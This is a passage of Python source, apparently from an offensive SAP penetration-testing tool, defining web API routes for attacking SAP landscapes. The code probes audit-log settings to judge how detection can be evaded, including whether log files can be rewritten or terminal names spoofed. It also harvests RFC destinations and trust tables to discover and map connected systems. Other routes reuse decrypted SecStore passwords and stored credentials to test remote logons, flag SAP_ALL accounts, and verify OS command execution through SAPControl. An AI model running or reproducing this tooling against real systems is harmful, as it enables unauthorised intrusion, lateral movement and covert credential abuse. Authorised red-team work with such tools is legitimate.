                      f"{out.get('error')}")
                emit_finding("WARNING", sid,
                              f"Evasion baseline failed: "
                              f"{out.get('error')}")
                return
            loot = out.get("snapshot_loot", "")
            pc = out.get("param_count", 0)
            fc = out.get("filter_row_count", 0)
            sal = getattr(node, "_evasion_baseline", None)
            sal_summary = ""
            if sal and sal.sal_config:
                slots = len(sal.sal_config.slots)
                sal_summary = (
                    f"; SAL v{sal.sal_config.version}, "
                    f"enable={sal.sal_config.enable!r}, "
                    f"{slots} slot(s)")
            elif fc:
                sal_summary = (
                    f"; legacy RSAUPROF {fc} row(s) (API absent)")
            print(f"[+] {sid}: Tier 3 baseline captured — "
                  f"{pc} param(s){sal_summary} → {loot}")
            emit_finding(
                "INFO", sid,
                f"Tier 3 evasion baseline captured: "
                f"{pc} params{sal_summary}",
                meta={"snapshot_loot": loot})

        _bg(f"{sid}:capture_evasion_baseline",
             "Capture Evasion Baseline", _run)
        return json.dumps({"status": "started"})

    @app.route("/api/node/<sid>/probe_telemetry", method="POST")
    def node_probe_telemetry(sid):
        """Tier 1 OPSEC enrichment — read-only ABAP audit posture probe."""
        response.content_type = "application/json"
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})

        def _run():
            import sapmap_telemetry
            creds = node.best_credentials()
            if creds is None or not creds.verified:
                print(f"[!] {sid}: telemetry probe needs verified RFC creds — "
                      f"complete user creation first")
                emit_finding(
                    "WARNING", sid,
                    "Telemetry probe skipped — no verified RFC credentials")
                return
            print(f"[*] {sid}: probing ABAP telemetry posture "
                  f"(SAL, integrity, ip_only, rec/client, stat/level, "
                  f"gw/log_level, rdisp/TRACE)")
            profile = sapmap_telemetry.read_abap_telemetry(node, creds)
            node.telemetry_profile = profile
            if profile.error:
                print(f"[!] {sid}: telemetry probe partial — {profile.error}")
            # Build a one-liner summary for the console + structured
            # finding the operator can drill into via the panel.
            slots_used = (f"{profile.sal_filter_slots}"
                           if profile.sal_filter_slots else "0")
            slots_conf = profile.sal_filter_slots_configured or "?"
            badges = (
                f"rsau/enable={profile.sal_state}",
                f"slots={slots_used}/{slots_conf}"
                + (f" [{profile.sal_filter_scope}]"
                   if profile.sal_filter_scope else ""),
                f"rsau/integrity={profile.sal_integrity}",
                f"rsau/ip_only={profile.sal_source_ip_only}",
                f"rec/client={profile.rec_client}",
                f"stat/level={profile.stat_level}",
                f"gw/logging={profile.gw_logging}",
                f"rdisp/TRACE={profile.rdisp_trace}",
            )
            msg = (f"OPSEC posture — " + ", ".join(badges))
            # Severity: bump to WARNING when something obviously
            # evasion-favourable is present (SAL off, integrity off,
            # ip_only off).  Otherwise INFO.
            sev = "INFO"
            risky = []
            if profile.sal_state.startswith("off"):
                risky.append("SAL disabled")
            if profile.sal_integrity.startswith("off"):
                risky.append("SAL integrity off — file rewrite viable")
            if profile.sal_source_ip_only.startswith("off"):
                risky.append("rsau/ip_only=0 — terminal-name spoofable")
            if profile.sal_filter_scope == "broad":
                risky.append("broad filter slot present")
            if risky:
                sev = "WARNING"
                msg += " | " + "; ".join(risky)
            emit_finding(sev, sid, msg)
            print(f"[+] {sid}: telemetry probe complete")

        _bg(f"{sid}:probe_telemetry", "Probe Telemetry", _run)
        return json.dumps({"status": "started"})

    @app.route("/api/node/<sid>/retrieve_rfcs", method="POST")
    def node_retrieve_rfcs(sid):
        response.content_type = "application/json"
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})

        def _run():
            creds = node.best_credentials()

            # Phase 3b: Retrieve-RFCs path for HTTP-only ABAP targets.
            # When the gateway port (33NN) is unreachable but we have
            # a SOAP-RFC route (from an HTTP destination's verified
            # creds), do the RFCDES/RFCTRUST/RFCSYSACL reads via
            # SOAPRFCSession.read_table.  Avoids the 3 × 60s pyrfc
            # timeouts that show up as "RFC_COMMUNICATION_FAILURE
            # partner '192.168.2.29:3340'".
            soap_route = find_soap_rfc_route_for_node(api.state, node)
            soap_session = None
            if soap_route:
                from sapmap_exploit import _gateway_port_reachable
                if not _gateway_port_reachable(node):
                    print(f"[*] {sid}: gateway down — routing "
                          f"Retrieve RFCs via SOAP-RFC "
                          f"({soap_route['host']}:{soap_route['port']}, "
                          f"via {soap_route['via_destination']})")
                    from sap_soap_basic import SOAPRFCSession
                    soap_session = SOAPRFCSession(
                        host=soap_route["host"],
                        port=soap_route["port"],
                        client=soap_route["client"],
                        user=soap_route["user"],
                        password=soap_route["password"],
                        https=soap_route["https"],
                    )

            if soap_session is not None:
                conns = sapmap_rfc.retrieve_rfc_connections_via_soap(
                    node, soap_session)
            else:
                conns = sapmap_rfc.retrieve_rfc_connections(
                    node, creds)
            print(f"[+] Retrieved {len(conns)} RFC connections from {sid}")

            # Track discovered systems to avoid duplicate pings
            # Key: (host, instance_nr) → dest_name for dedup
            discovered = {}

            for conn in conns:
                # Detect self-referencing RFC destinations
                th = (conn.target_host or '').strip().lower()
                ti = (conn.target_ip or '').strip()
                # Type H/G connections don't populate target_host/target_ip —
                # the host lives inside http_url.  Extract it so the self-
                # check doesn't default to is_self=True on empty strings.
                if not th and not ti and conn.conn_type == "http" and conn.http_url:
                    try:
                        from urllib.parse import urlparse as _urlparse
                        _parsed_host = (_urlparse(conn.http_url).hostname or "").strip()
                        th = _parsed_host.lower()
                        ti = _parsed_host
                    except Exception:
                        pass
                own_names = {s.lower() for s in [
                    node.hostname, node.ip, 'localhost', '127.0.0.1',
                ] if s}
                own_names.update(h.lower() for h in node.all_hostnames())
                own_names.update(node.all_ips())
                is_self = (not th and not ti) or th in own_names or ti in own_names
                # Same host but different instance = NOT self
                if is_self and conn.target_instance_nr:
                    own_instances = set(node.instance_nrs())
                    target_inst = conn.target_instance_nr.strip().zfill(2)
                    if own_instances and target_inst not in own_instances:
                        is_self = False
                if is_self:
                    conn.target_host = node.hostname or node.ip
                    conn.target_sid = node.sid
                else:
                    # For HTTP connections, target_host/target_ip are
                    # empty — the host lives in http_url.  Extract it
                    # so find_node_by_host can resolve the target.
                    _th = conn.target_host or ""
                    _ti = conn.target_ip or ""
                    if not _th and not _ti and conn.conn_type == "http" and conn.http_url:
                        try:
                            from urllib.parse import urlparse as _up
                            _url_host = (_up(conn.http_url).hostname or "").strip()
                            _th = _url_host
                            _ti = _url_host
                        except Exception:
                            pass
                    target = api.state.find_node_by_host(
                        hostname=_th, ip=_ti,
                        instance_nr=conn.target_instance_nr or "",
                    )
                    if target:
                        conn.target_sid = target.sid
                api.state.add_connection(conn)

            # Ping each non-self connection and auto-discover systems.
            # DEST_CHECK_CONNECTION returns the remote SID so we can
            # do SID-first mapping instead of host-first.
            # HTTP connections carry the host in http_url, not
            # target_host — accept either field.
            non_self = [c for c in conns
                        if c.target_sid != sid
                        and (c.target_host or c.http_url)]

            if non_self:
                print(f"[*] Pinging {len(non_self)} remote RFC destinations...")

            # discovered: (host, inst) → {dest_name, remote_sid, remote_host}
            discovered = {}
            import sapmap_stop

            for conn in non_self:
                if sapmap_stop.is_stop_requested():
                    print(f"[!] STOP — retrieve-RFCs ping loop "
                          f"aborted ({len(discovered)} probed)")
                    return
                host = conn.target_ip or conn.target_host or ""
                # HTTP connections carry the host in http_url only.
                if not host and conn.conn_type == "http" and conn.http_url:
                    try:
                        from urllib.parse import urlparse as _up2
                        host = (_up2(conn.http_url).hostname or "").strip()
                    except Exception:
                        pass
                inst = conn.target_instance_nr or "00"
                key = (host.lower(), inst)

                if key in discovered:
                    # Already pinged this host+instance, reuse SID
                    prev = discovered[key]
                    conn.ping_ok = True
                    conn.tested = True
                    if prev.get("remote_sid"):
                        conn.target_sid = prev["remote_sid"]
                    api.state.add_connection(conn)
                    time.sleep(0.4)
                    continue

                print(f"[*] Ping {conn.destination_name} → "
                      f"{host}...")
                # Type-G / Type-H HTTP destinations: probe the URL's
                # host+port directly, NOT the 33NN gateway.  The
                # generic DEST_CHECK_CONNECTION / IWB / direct-TCP
                # cascade falls back to 3300+int(inst) which is a
                # Type-3 assumption — for Type-G that misreads the
                # RFCOPTIONS S= (HTTP port) as an instance number and
                # probes the wrong port entirely.  http_dest_ping is
                # the correct path: TCP+GET on the URL, ICF-NF marker
                # lift, Note 1177315 reinterpretation.
                if conn.conn_type == "http":
                    ping = sapmap_rfc.http_dest_ping(conn, timeout=5.0)
                elif soap_session is not None:
                    # Phase 3b: route DEST_CHECK_CONNECTION through SOAP
                    # too when the source node's gateway port is firewalled
                    # — otherwise each ping spends 60-90s on pyrfc TCP
                    # retries (× 7 destinations = ~10 minutes wasted).
                    ping = soap_session.dest_check_connection(
                        conn.destination_name)
                else:
                    ping = sapmap_rfc.ping_rfc_destination(
                        node, conn.destination_name, creds
                    )

                if ping["ping_ok"]:
                    dest_sid = ping.get("remote_sid", "").strip()
                    remote_ip = ping.get("remote_ip", "").strip()
                    remote_host = (
                        ping.get("remote_hostname", "").strip()
                        or conn.target_host or host)
                    # If target_host was a hostname (not IP), use the
                    # IP returned by RFC_SYSTEM_INFO on the SAP system
                    if remote_ip and remote_ip != host:
                        print(f"[*] Resolved {host} → {remote_ip} "
                              f"(via RFC_SYSTEM_INFO)")
                        conn.target_ip = remote_ip
                        host = remote_ip
                        key = (host.lower(), inst)  # update dedup key
                    print(f"[+] {conn.destination_name}: alive"
                          f"{f' (SID={dest_sid})' if dest_sid else ''}"
                          f" ({ping['ping_message'][:60]})")
                    conn.ping_ok = True
                    conn.tested = True

                    # Use instance_nr from ping (RFCDEST field) when
                    # available — more reliable than the "00" default.
                    ping_inst = ping.get(
                        "remote_instance_nr", "").strip()
                    if ping_inst:
                        inst = ping_inst
                        key = (host.lower(), inst)

                    # Build _http_info from ping results so
                    # _correct_node_from_http works on existing nodes.
                    _http_info = {}
                    if ping_inst:
                        _http_info["instance_nr"] = ping_inst
                    if remote_ip:
                        _http_info["ip"] = remote_ip
                    if remote_host:
                        _http_info["hostname"] = remote_host

                    # For HTTP connections without instance from ping,
                    # fall back to direct HTTP probe.
                    if (conn.conn_type == "http"
                            and conn.http_url
                            and not ping_inst):
                        try:
                            from urllib.parse import (
                                urlparse as _up_early)
                            _pe = _up_early(conn.http_url)
                            _base_e = (f"{_pe.scheme}://"
                                       f"{_pe.netloc}")
                            print(f"[*] Probing {_pe.netloc} for "
                                  f"instance via HTTP...")
                            _hi = _discover_sid_http(_base_e)
                            if _hi.get("sid") and not dest_sid:
                                dest_sid = _hi["sid"]
                            if _hi.get("instance_nr"):
                                inst = _hi["instance_nr"]
                                key = (host.lower(), inst)
                                _http_info["instance_nr"] = inst
                            if _hi.get("ip") and not remote_ip:
                                host = _hi["ip"]
                                conn.target_ip = host
                                key = (host.lower(), inst)
                                _http_info["ip"] = host
                            if _hi.get("hostname"):
                                remote_host = _hi["hostname"]
                                _http_info["hostname"] = remote_host
                        except Exception:
                            pass

                    discovered[key] = {
                        "dest_name": conn.destination_name,
                        "remote_sid": "",  # set below once resolved
                        "remote_host": remote_host,
                    }

                    # ---- SID-first mapping ----
                    # 1. If we got a remote SID, look it up directly
                    if dest_sid:
                        existing_sid_node = api.state.get_node(dest_sid)
                        if existing_sid_node:
                            _correct_node_from_http(
                                existing_sid_node, _http_info)
                            conn.target_sid = dest_sid
                            discovered[key]["remote_sid"] = dest_sid
                            api.state.add_connection(conn)
                            time.sleep(0.6)
                            if dest_sid == node.sid:
                                print(f"[*] {conn.destination_name}: "
                                      f"self-reference ({node.sid})")
                            else:
                                print(f"[*] {conn.destination_name}: "
                                      f"maps to existing {dest_sid}")
                            continue

                    # 2. Fall back to host+instance matching
                    existing = api.state.find_node_by_host(
                        hostname=host, ip=host, instance_nr=inst)
                    if existing:
                        _correct_node_from_http(existing, _http_info)
                        conn.target_sid = existing.sid
                        discovered[key]["remote_sid"] = existing.sid
                        api.state.add_connection(conn)
                        time.sleep(0.6)
                        if existing.sid == node.sid:
                            print(f"[*] {conn.destination_name}: "
                                  f"self-reference ({node.sid})")
                        else:
                            print(f"[*] {conn.destination_name}: "
                                  f"maps to existing {existing.sid}")
                        continue

                    # 3. No existing node — Host Agent 1128 SOAP fallback
                    #    before the last-resort SID derivation.  Many
                    #    firewalled RFC targets expose only port 1128
                    #    (SolMan / LaMa / DBACockpit rely on it) and
                    #    GetSystemInstanceList returns the real SID
                    #    without auth.  Without this, an interactive
                    #    "Retrieve RFC Destinations" ended up plotting
                    #    IP-derived placeholders like "10_" or "172".
                    if not dest_sid and host:
                        try:
                            from sapmap_scanner import (
                                query_host_agent_sid)
                            _ha = query_host_agent_sid(
                                host, timeout=2.5)
                            if _ha and _ha.get("sid"):
                                dest_sid = _ha["sid"]
                                if (_ha.get("instance_nr")
                                        and not _http_info.get(
                                            "instance_nr")):
                                    _http_info["instance_nr"] = (
                                        _ha["instance_nr"])
                                    inst = _ha["instance_nr"]
                                    key = (host.lower(), inst)
                                if _ha.get("http_port"):
                                    _http_info["icm_port"] = (
                                        _ha["http_port"])
                                    _http_info["icm_scheme"] = "http"
                                elif _ha.get("https_port"):
                                    _http_info["icm_port"] = (
                                        _ha["https_port"])
                                    _http_info["icm_scheme"] = "https"
                        except Exception as _ha_err:
                            print(f"[!] Host Agent probe on "
                                  f"{host} failed: {_ha_err!s:.80}")

                    # 4. Still nothing — derive from name/host as
                    #    absolute last resort.
                    if not dest_sid:
                        dest_sid = _derive_sid(
                            conn.destination_name, host)
                        print(f"[*] Could not get remote SID, "
                              f"using derived: {dest_sid}")

                    # Check if SID already on map but different host
                    existing_sid_node = api.state.get_node(dest_sid)
                    if existing_sid_node:
                        # Same SID exists — verify it's the same system
                        existing_ips = existing_sid_node.all_ips()
                        existing_names = existing_sid_node.all_hostnames()
                        is_same = False

                        if host in existing_ips or host.lower() in existing_names:
                            is_same = True

                        if not is_same:
                            resolved_ip = _resolve_host(host)
                            if resolved_ip and resolved_ip in existing_ips:
                                is_same = True

                        if not is_same and existing_sid_node.hostname:
                            existing_resolved = _resolve_host(
                                existing_sid_node.hostname)
                            rfc_resolved = _resolve_host(host)
                            if (existing_resolved and rfc_resolved
                                    and existing_resolved == rfc_resolved):
                                is_same = True

                        if not is_same and remote_host:
                            if (remote_host in existing_ips or
                                    remote_host.lower() in existing_names):
                                is_same = True
                            else:
                                rh_ip = _resolve_host(remote_host)
                                if rh_ip and rh_ip in existing_ips:
                                    is_same = True

                        if is_same and inst:
                            existing_insts = existing_sid_node.instance_nrs()
                            if existing_insts and inst.zfill(2) not in existing_insts:
                                is_same = False

                        if is_same:
                            _correct_node_from_http(
                                existing_sid_node, _http_info)
                            conn.target_sid = dest_sid
                            discovered[key]["remote_sid"] = dest_sid
                            api.state.add_connection(conn)
                            time.sleep(0.6)
                            print(f"[*] {conn.destination_name}: "
                                  f"same system as {dest_sid}")
                            continue
                        else:
                            base_sid = dest_sid
                            counter = 1
                            while api.state.get_node(dest_sid):
                                dest_sid = (f"{base_sid}"
                                            f"{counter}")
                                counter += 1
                            print(f"[*] SID {base_sid} exists "
                                  f"with different IP, "
                                  f"using {dest_sid}")

                    # Add new system to map.  For HTTP connections
                    # prefer the instance_nr from the HTTP probe
                    # (RFC_SYSTEM_INFO / error page) over guessing
                    # from the port number.
                    if conn.conn_type == "http" and conn.http_url:
                        try:
                            from urllib.parse import urlparse as _up3
                            _purl = _up3(conn.http_url)
                            url_port = _purl.port
                        except Exception:
                            url_port = None
                        if _http_info.get("instance_nr"):
                            inst = _http_info["instance_nr"]
                        elif url_port and 8000 <= url_port <= 8999:
                            inst = f"{(url_port - 8000) // 100:02d}"
                        if _http_info.get("ip"):
                            host = _http_info["ip"]
                            key = (host.lower(), inst)
                        if _http_info.get("hostname"):
                            remote_host = _http_info["hostname"]
                        # Only record ports we've actually verified.
                        # Probed icm_port → icm-http(s); URL port (if
                        # different) → http.  Do NOT speculate
                        # dispatcher 32NN / gateway 33NN — they may
                        # be firewalled (which is the whole reason
                        # Type-G/H destinations exist).
                        ports = {}
                        if _http_info.get("icm_port"):
                            scheme = _http_info.get(
                                "icm_scheme", "http")
                            lbl = ("icm-https" if scheme == "https"
                                   else "icm-http")
                            ports[int(_http_info["icm_port"])] = lbl
                        elif url_port:
                            ports[int(url_port)] = "http"
                    else:
                        # Type-3 RFC destination — the gateway port
                        # WAS actually used (ping succeeded), so 33NN
                        # is verified.  Dispatcher 32NN is still
                        # speculative but typically co-installed.
                        ports = {
                            int(f"32{inst}"): "dispatcher",
                            int(f"33{inst}"): "gateway",
                        }
                    # BTP subaccount detection — hostnames matching
                    # *.hana.ondemand.com are BTP tenants, not on-prem
                    # SAP systems.  Plot them as cloud-shaped nodes
                    # (state.btp_subaccounts) instead of the default
                    # rectangular SAPNode.
                    _btp_host_lo = (remote_host or host or "").lower()
                    if ".hana.ondemand.com" in _btp_host_lo:
                        try:
                            from sapmap_models import (
                                BTPSubaccountNode)
                            _bparts = _btp_host_lo.split(".")
                            _bsubdomain = _bparts[0] if _bparts else ""
                            _bregion = (_bparts[2]
                                         if len(_bparts) >= 3 else "")
                            _btp_uuid = _btp_host_lo
                            if _btp_uuid not in api.state.btp_subaccounts:
                                api.state.btp_subaccounts[_btp_uuid] = (
                                    BTPSubaccountNode(
                                        uuid=_btp_uuid,
                                        display_name=(
                                            _bsubdomain
                                            or _btp_host_lo),
                                        region=_bregion,
                                        subdomain=_bsubdomain,
                                    ))
                                print(f"[+] Discovered BTP subaccount "
                                      f"{_bsubdomain or _btp_host_lo} "
                                      f"— plotted as cloud "
                                      f"(hana.ondemand.com host)")
                            conn.target_sid = _btp_uuid
                            conn.is_btp_dest = True
                            discovered[key]["remote_sid"] = _btp_uuid
                            api.state.add_connection(conn)
                            time.sleep(0.6)
                            continue
                        except Exception as _btp_err:
                            print(f"[!] BTP node creation failed for "
                                  f"{_btp_host_lo}: {_btp_err!s:.80}")
                            # Fall through to standard SAPNode path.

                    new_inst = InstanceInfo(
                        instance_nr=inst, ip=host,
                        ports=ports)
                    new_node = SAPNode(
                        sid=dest_sid, ip=host,
                        hostname=remote_host,
                        instances=[new_inst])
                    api.state.add_node(new_node)
                    conn.target_sid = dest_sid
                    discovered[key]["remote_sid"] = dest_sid
                    api.state.add_connection(conn)
                    time.sleep(1.2)  # longer pause for new system discovery
                    label = ("HTTP" if conn.conn_type == "http"
                             else "RFC")
                    print(f"[+] Discovered {dest_sid} via {label} dest "
                          f"({remote_host}/{host}, "
                          f"inst {inst}) — added to map")
                else:
                    print(f"[-] {conn.destination_name}: not reachable"
                          f"{' — ' + ping['error'][:60] if ping['error'] else ''}")
                    conn.ping_ok = False
                    conn.tested = True
                    api.state.add_connection(conn)
                    time.sleep(0.4)

            alive = len(discovered)
            print(f"[+] Ping results: {alive} alive systems, "
                  f"{len(non_self) - alive} unreachable")

            # Read trust tables for intelligence
            try:
                if soap_session is not None:
                    trust = sapmap_rfc.retrieve_rfctrust_via_soap(
                        node, soap_session)
                else:
                    trust = sapmap_rfc.retrieve_rfctrust(node, creds)
                # NOTE: we deliberately do NOT cross-reference RFCTRUST
                # entries onto individual RFCConnection objects to mark
                # them trusted_system=True.  RFCTRUST registers that a
                # trust relationship EXISTS between two systems, but
                # the per-destination trust flag is set per-row in
                # RFCDES via Q=Y -- and only destinations with Q=Y
                # actually use the assertion-ticket path.  Operators
                # commonly have multiple RFC destinations from system
                # A to system B where only a subset have "Trust
                # Relationship: Yes" in SM59; blanket-marking everything
                # pointing at a trusted target produced false positives
                # (e.g. TEST_MARC_H on S4D->AED showed up as trusted
                # despite Q=Y being absent from its RFCOPTIONS).
                # _rfcdes_is_trusted in sapmap_rfc is the authoritative
                # per-destination check.
                if trust:
                    print(f"[*] {sid}: RFCTRUST has {len(trust)} "
                          f"system-level trust entries (intelligence "
                          f"only; per-destination trust is determined "
                          f"by RFCDES Q=Y)")
            except Exception as e:
                logger.debug(f"RFCTRUST read failed for {sid}: {e}")
            try:
                if soap_session is not None:
                    acl = sapmap_rfc.retrieve_rfcsysacl_via_soap(
                        node, soap_session)
                else:
                    acl = sapmap_rfc.retrieve_rfcsysacl(node, creds)
                if acl:
                    node.rfcsysacl_entries = acl
            except Exception as e:
                logger.debug(f"RFCSYSACL read failed for {sid}: {e}")

        _bg(f"{sid}:retrieve_rfcs", "Retrieve RFCs", _run)
        return json.dumps({"status": "started"})

    @app.route("/api/node/<sid>/test_rfcs", method="POST")
    def node_test_rfcs(sid):
        response.content_type = "application/json"
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})

        def _run():
            creds = node.best_credentials()
            conns = api.state.get_connections_from(sid)
            tested_count = 0
            logon_ok_count = 0
            sap_all_count = 0
            # Only test connections whose target is a known node on the map
            mapped_conns = [c for c in conns
                            if c.target_sid and api.state.get_node(c.target_sid)]
            skipped = len(conns) - len(mapped_conns)
            for conn in mapped_conns:
                conn.tested = False
                api.state.rfc_check_cache.pop(conn.destination_name, None)
            print(f"[*] RFC Testing: {sid} — {len(mapped_conns)} mapped connection(s) "
                  f"to check{f' ({skipped} unmapped skipped)' if skipped else ''}")
            import sapmap_stop
            for conn in mapped_conns:
                if sapmap_stop.is_stop_requested():
                    print(f"[!] STOP — bulk RFC test aborted "
                          f"({tested_count}/{len(mapped_conns)} done)")
                    return
                print(f"[*] Testing {conn.destination_name}...")
                result = sapmap_rfc.test_rfc_destination(
                    node, conn.destination_name, creds, api.state.rfc_check_cache,
                    rfc_conn=conn,
                )
                conn.logon_successful = result.get("logon_ok", False)
                conn.logon_tested = True
                conn.ping_ok = result.get("ping_ok", False)
                conn.latency_ms = result.get("latency_ms", 0)
                conn.tested = True
                tested_count += 1

                if conn.logon_successful:
                    logon_ok_count += 1
                    print(f"[+] {conn.destination_name}: Logon successful!")
                    target = api.state.get_node(conn.target_sid)
                    if target:
                        target.has_critical_finding = True

                if conn.logon_successful and conn.rfc_user and not conn.profiles:
                    info = sapmap_rfc.get_remote_user_profiles(
                        node, conn.rfc_user, conn.destination_name, creds
                    )
                    conn.profiles = info.get("profiles", [])
                    conn.has_sap_all = info.get("has_sap_all", False)
                    conn.user_detail_error = info.get("error", "")
                    if conn.has_sap_all:
                        sap_all_count += 1
                        print(f"[!] {conn.rfc_user} in {conn.destination_name} has SAP_ALL!")
                    api.state.notify_sap_all_if_elevated(conn)
            print(f"[+] RFC Testing done for {sid}: "
                  f"{tested_count} tested, {logon_ok_count} logon OK, "
                  f"{sap_all_count} with SAP_ALL")

        _bg(f"{sid}:test_rfcs", "Test RFCs", _run)
        return json.dumps({"status": "started"})

    @app.route("/api/node/<sid>/test_rfc_single", method="POST")
    def node_test_rfc_single(sid):
        response.content_type = "application/json"
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})
        data = request.json or {}
        dest_name = data.get("destination_name", "")
        if not dest_name:
            return json.dumps({"error": "destination_name required"})

        def _run():
            creds = node.best_credentials()
            conn = None
            for c in api.state.get_connections_from(sid):
                if c.destination_name == dest_name:
                    conn = c
                    break
            if not conn:
                print(f"[-] Connection {dest_name} not found on {sid}")
                return
            # Clear cache so it actually re-tests
            conn.tested = False
            api.state.rfc_check_cache.pop(dest_name, None)
            is_type_t = conn.sapxpg_remote_works or dest_name.startswith("SAPMAP_")

            # ---- HTTP destination (Type G/H) ----
            # Phase 1: DEST_CHECK_CONNECTION (ping_ok = HTTP works).
            # Phase 2: HTTP probe target for correct instance_nr.
            # Phase 3: direct RFC logon → profiles/SAP_ALL
            #          → enables "Create Remote User".
            if (conn.conn_type or "").lower() == "http":
                print(f"[*] Testing HTTP destination: {dest_name}...")
                # Re-run the Type-G classifier on every Test HTTP.
                # Cheap (no network calls), and it means connections
                # retrieved BEFORE the classifier logic existed get
                # upgraded automatically on the first re-test — no
                # need to re-retrieve the whole RFCDES table.
                try:
                    sapmap_rfc._classify_type_g_target(conn)
                except Exception:
                    pass
                # Direct HTTP probe from SAPMAP against the URL's real
                # host:port.  Runs FIRST because the ABAP-side
                # DEST_CHECK_CONNECTION frequently reports SDEST 047
                # CHECK_NOT_POSSIBLE on Type-G destinations to hosts
                # the source system can't route to (external
                # webservices, cross-VPC targets, etc.) — which was
                # producing "HTTP connection failed
                # (ABAPApplicationError: RFC_ABAP_EXCEPTION ...)" even
                # when the URL is up and answering.  Our probe uses
                # the correct URL:port from conn.http_url, applies
                # ICF-NF lift + Note 1177315, and never touches the
                # ABAP RFC layer.
                _t0 = time.time()
                _http_ping = sapmap_rfc.http_dest_ping(conn, timeout=8.0)
                conn.latency_ms = int((time.time() - _t0) * 1000)
                conn.tested = True
                conn.ping_ok = _http_ping.get("ping_ok", False)
                conn.logon_tested = True
                if conn.ping_ok:
                    conn.logon_successful = True
                    msg = (_http_ping.get("ping_message") or "").strip()
                    if not msg:
                        msg = "OK"
                    print(f"[+] {dest_name}: HTTP {conn.http_status or ''} "
                          f"OK ({msg[:120]})")
                    _rs = _http_ping.get("remote_sid", "").strip()
                    if _rs and not conn.target_sid:
                        tgt = api.state.get_node(_rs)
                        if tgt:
                            conn.target_sid = _rs
                            print(f"[*] {dest_name}: resolved target "
                                  f"→ {_rs} (from ICF-NF lift)")
                    # Reachable Type-G: promote to a placeholder
                    # node if there's no existing one yet.  Only fires
                    # on ping_ok=True — unreachable destinations stay
                    # target-less and their line stays hidden.
                    api.state.materialise_type_g_target(
                        conn, allow_placeholder=True)
                    if conn.target_sid:
                        target = api.state.get_node(conn.target_sid)
                        if target:
                            target.has_critical_finding = True
                else:
                    conn.logon_successful = False
                    err = (_http_ping.get("error") or "").strip()
                    err_short = err[:160]
                    if err_short:
                        print(f"[-] {dest_name}: HTTP probe failed "
                              f"({err_short})")
                    else:
                        print(f"[-] {dest_name}: HTTP probe failed")

                # Phase 2: discover target SID + instance via RFC ping
                # (DEST_CHECK_CONNECTION returns RFCDEST with instance).
                _probed_inst = ""
                _hi = {}
                try:
                    _ping2 = sapmap_rfc.ping_rfc_destination(
                        node, dest_name, creds)
                    _pi = _ping2.get(
                        "remote_instance_nr", "").strip()
                    if _pi:
                        _probed_inst = _pi
                        _hi["instance_nr"] = _pi
                    if _ping2.get("remote_ip"):
                        _hi["ip"] = _ping2["remote_ip"].strip()
                    if _ping2.get("remote_hostname"):
                        _hi["hostname"] = (
                            _ping2["remote_hostname"].strip())
                    _ps = _ping2.get("remote_sid", "").strip()
                    if _ps and not conn.target_sid:
                        tgt = api.state.get_node(_ps)
                        if tgt:
                            conn.target_sid = _ps
                            print(f"[*] {dest_name}: resolved "
                                  f"target → {conn.target_sid}")
                except Exception:
                    pass
                if conn.target_sid:
                    target_node = api.state.get_node(conn.target_sid)
                    if target_node:
                        _correct_node_from_http(target_node, _hi)
                        target_node.has_critical_finding = True

                # Backfill secstore_password from source node's
                # decrypted SecStore entries — covers connections that
                # were created before the SecStore extraction ran.
                if not conn.secstore_password and getattr(
                        node, "secstore_entries", None):
                    for _entry in node.secstore_entries:
                        if (_entry.get("dest_name", "") == dest_name
                                and _entry.get("password")):
                            conn.secstore_password = _entry["password"]
                            print(f"[+] {dest_name}: backfilled "
                                  f"SecStore password from "
                                  f"{node.sid}.secstore_entries")
                            break

                # Phase 3: direct RFC logon to check profiles + SAP_ALL.
                # Password source priority:
                #   1. conn.secstore_password (decrypted from RSECTAB)
                #   2. target node's stored credentials for rfc_user
                #   3. source node's stored credentials for rfc_user
                #      (same user often shared across landscape)
                rfc_user = conn.rfc_user or ""
                rfc_pwd = conn.secstore_password or ""
                pwd_source = "secstore" if rfc_pwd else ""
                if not rfc_pwd and rfc_user and conn.target_sid:
                    tn = api.state.get_node(conn.target_sid)
                    if tn:
                        for tc in tn.credentials:
                            if (tc.username == rfc_user
                                    and tc.password):
                                rfc_pwd = tc.password
                                pwd_source = f"{conn.target_sid} creds"
                                break
                if not rfc_pwd and rfc_user:
                    for tc in node.credentials:
                        if (tc.username == rfc_user
                                and tc.password):
                            rfc_pwd = tc.password
                            pwd_source = f"{node.sid} creds"
                            break
                if not rfc_user:
                    print(f"[!] {dest_name}: no rfc_user on "
                          f"connection — 'Create Remote User' "
                          f"button needs a username")
                elif not conn.target_sid:
                    print(f"[!] {dest_name}: target SID unresolved "
                          f"— 'Create Remote User' button needs a "
                          f"target node")
                elif not rfc_pwd:
                    print(f"[!] {dest_name}: no password for "
                          f"{rfc_user} — 'Create Remote User' "
                          f"button needs a password (run SecStore "
                          f"extraction or add {rfc_user} to "
                          f"{conn.target_sid} credentials)")
                else:
                    print(f"[*] {dest_name}: password sourced from "
                          f"{pwd_source}")
                # SAPControl / Host Agent destinations don't speak
                # RFC — they expose their own SOAP contract at
                # urn:SAPControl.  Skip the direct RFC + SOAP-RFC
                # RFC_PING cascade entirely and probe the endpoint
                # with a SAPControl <GetProcessList/> call instead.
                # Sets os_exec_verified on success — the credential
                # unlocks OS commands via OSExecute.
                if (rfc_user and rfc_pwd
                        and (conn.os_access_type or "").startswith(
                            ("sapcontrol", "hostagent"))):
                    print(f"[*] {dest_name}: SAPControl auth probe on "
                          f"{conn.http_url} as {rfc_user}...")
                    _sc_result = sapmap_rfc.sapcontrol_auth_probe(
                        conn.http_url, rfc_user, rfc_pwd, timeout=8.0)
                    if _sc_result["ok"]:
                        # Stage 1 (GetInstanceProperties) is UNAUTH
                        # on default kernels — it proves the endpoint
                        # is a SAPControl but not that our credential
                        # works.  Stage 2 (AccessCheck) is what
                        # actually validates the password + authz;
                        # only flip os_exec_verified when it returned
                        # <access>1</access>.
                        _osx = int(_sc_result.get("osexec_access", -1))
                        conn.logon_successful = (_osx == 1)
                        conn.os_exec_verified = (_osx == 1)
                        if _osx == 1:
                            conn.os_exec_channel = "sapcontrol"
                        # Stage 3 result (OS hint from uname probe).
                        # Cached on the connection so subsequent
                        # OSExecute calls pick the right shell wrap
                        # without needing another round-trip.
                        _oh = (_sc_result.get("os_hint") or "").strip()
